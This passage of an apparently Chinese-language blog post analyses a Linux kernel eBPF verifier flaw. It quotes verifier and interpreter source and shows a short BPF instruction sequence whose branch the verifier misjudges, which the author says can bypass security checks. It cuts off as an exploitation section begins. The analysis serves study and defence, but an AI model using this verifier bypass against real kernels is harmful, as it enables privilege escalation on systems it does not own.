class="line"></span><br><span class="line">  <span class="comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span></span><br><span class="line"><span class="comment"> * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!env)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">  mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">    <span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment"> * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    log_level = attr-&gt;log_level;</span><br><span class="line">    log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">    log_size = attr-&gt;log_size;</span><br><span class="line">    log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = -EINVAL;</span><br><span class="line">    <span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">    <span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">        log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">    ret = -ENOMEM;</span><br><span class="line">    log_buf = vmalloc(log_size);</span><br><span class="line">    <span class="keyword">if</span> (!log_buf)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log_level = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = replace_map_fd_with_map_ptr(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">                                 GFP_USER);</span><br><span class="line">  ret = -ENOMEM;</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  ret = check_cfg(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">  ret = do_check(env);</span><br><span class="line"></span><br><span class="line">  skip_full_check:</span><br><span class="line">  <span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">  free_states(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">    ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">    BUG_ON(log_len &gt;= log_size);</span><br><span class="line">    <span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">    ret = -ENOSPC;</span><br><span class="line">    <span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    ret = -EFAULT;</span><br><span class="line">    <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">    <span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">                                              <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">                                              GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">      ret = -ENOMEM;</span><br><span class="line">      <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">           <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment"> * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    convert_pseudo_ld_imm64(env);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_log_buf:</span><br><span class="line">  <span class="keyword">if</span> (log_level)</span><br><span class="line">    vfree(log_buf);</span><br><span class="line">  free_env:</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">    <span class="comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment"> * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    release_maps(env);</span><br><span class="line">  *prog = env-&gt;prog;</span><br><span class="line">  kfree(env);</span><br><span class="line">  mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是使用<code>check_cfg</code>函数借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，避免造成无法预期的风险。最后则是使用<code>do_check</code>函数模拟执行一次注入代码，会将注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，会模拟每条指令的执行，包括堆栈、寄存器、访问内存、调用函数等。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里的漏洞发生在<code>do_check</code>函数和最后真正运行的<code>__bpf_prog_run</code>翻译结果不一致导致的。这里用如下代码来演示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure><p>首先看一下<code>do_check</code>函数中处理的事情：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init_reg_state(regs);</span><br><span class="line">insn_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">insn_idx, insn_cnt);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insn = &amp;insns[insn_idx]; </span><br><span class="line"><span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在一个for死循环，最后会返回<code>BPF_CLASS</code>获得的指令操作码类型。</p><p>第一条指令是<code>BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)</code>，BPF_MOV指令属于ALU大类中，在检测到指令类型是ALU，进入如下分支，调用<code>check_alu_op()</code>函数继续判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;</span><br><span class="line">err = check_alu_op(env, insn);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>check_alu_op()</code>函数，上面这条代码的指令操作码为BPF_MOV，进入如下分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">      <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment"> * copy register state to dest reg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">          verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                  insn-&gt;src_reg);</span><br><span class="line">          <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">        regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//BPF_K</span></span><br><span class="line">      <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment"> * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">      regs[insn-&gt;dst_reg].type = CONST_IMM; </span><br><span class="line">      regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里最后是将指令的立即数保存到了reg_state结构体中的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">    <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment"> *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，这里的imm也是有符号整数，和<code>bpf_insn</code>结构体中的imm类型一致。<br>检查第二条指令<code>BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)</code>，这是一条JMP指令，在<code>do_check</code>函数中会进入如下分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">  u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = check_call(env, insn-&gt;imm);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment"> * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment"> * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment"> * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment"> * something into it earlier</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    process_bpf_exit:</span><br><span class="line">    insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      do_print_state = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的else语句也就是JNE所进入的分支，所以会进一步进入<code>check_cond_jmp_op</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">    <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment"> * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    *insn_idx += insn-&gt;off;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment"> * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment"> * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数内部存在这样一条if语句，由前面提到了在<code>reg_state</code>结构体中的imm和<code>insn</code>中的imm都是int类型，并且<code>reg_state</code>结构体中的imm是由<code>insn</code>中直接赋值过去的，所以这个条件会恒等。所以当操作码为<code>BPF_JNE</code>时，永远都不会跳转。</p><p>上面是模拟执行的情况，那么下面看看真实执行情况是什么样子的，首先真实执行情况的函数为<code>__bpf_prog_run</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line"><span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line"><span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">[BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到函数这里维护的是一个跳表，根据opcode来进行跳转，并且没有任何检测。这里重点关注一下上述例子中的跳转函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Jumps */</span></span><br><span class="line">[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br></pre></td></tr></table></figure><p>可以看到这里赋值的是<code>JMP_JNE_K</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">  insn += insn-&gt;off;</span><br><span class="line">  CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure><p>这里就比较关注DST和IMM的定义了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Named registers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSTregs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRCregs[insn-&gt;src_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FPregs[BPF_REG_FP]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARG1regs[BPF_REG_ARG1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CTXregs[BPF_REG_CTX]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMMinsn-&gt;imm</span></span><br></pre></td></tr></table></figure><p>可以看到这里IMM的定义依旧是从insn中拿出来的，然而这里的DST是直接从约定的寄存器中拿出来，然而在<code>__bpf_prog_run</code>函数的开头可以看出来这里的寄存器定义为<code>unsigned long long int</code>类型，那么如果重新执行上述演示代码就会出现跳转，也就是说检查和实际运行的指令执行流程会不一致，可以利用这个绕过安全检测。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="退出do-check"><a href="#退出do-check" class="headerlink" title="退出do_check"></a>退出<code>do_check</code></h3><p>但就目前来看依旧存在的一个问题就是虽然他会进入<code>BPF_EXIT</code>分支，但是在最后的pop_stack需要返回的值为负数才能结束循环退出<code>do_check</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 